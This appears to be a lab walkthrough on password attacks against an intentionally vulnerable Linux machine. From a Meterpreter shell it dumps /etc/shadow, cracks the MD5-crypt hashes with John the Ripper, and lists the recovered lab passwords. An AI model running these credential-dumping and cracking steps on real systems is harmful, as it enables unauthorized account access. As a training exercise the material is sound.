# Password Attacks

1. In Meterpreter shell, first we get the hashes:

- cat /etc/shadow > /tmp/hashes.txt

root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::

2.Save all the hashes in a file

- nano combo.txt   :

3.using JOHN - THE RIPPER for cracking the hashes

- john combo.txt :

Created directory: /home/samiksha/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
user             (user)     
service          (service)     
postgres         (postgres)     
msfadmin         (msfadmin)     
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
123456789        (klog)     
batman           (sys)     
Proceeding with incremental:ASCII
6g 0:00:04:07  3/3 0.02429g/s 197740p/s 197742c/s 197742C/s lmbee07..lmb1t47
6g 0:00:28:52  3/3 0.003464g/s 163536p/s 163536c/s 163536C/s art212m..artoy8c
6g 0:00:28:53  3/3 0.003462g/s 163575p/s 163575c/s 163575C/s aaset8/..aasios6
6g 0:00:28:56  3/3 0.003456g/s 163674p/s 163674c/s 163674C/s j13569m..j13630k

<img width="1618" height="602" alt="image" src="https://github.com/user-attachments/assets/6c4484af-5729-4785-8364-ad923e0047b1" />

---

4.we get in .john directory and cat our cracked hashes

- cat john.pot :

$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:user
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:service
$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:postgres
$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:msfadmin
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:123456789
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:batman

<img width="810" height="277" alt="image" src="https://github.com/user-attachments/assets/06b0d3fc-f826-41b4-b3a1-79bc25021b76" />

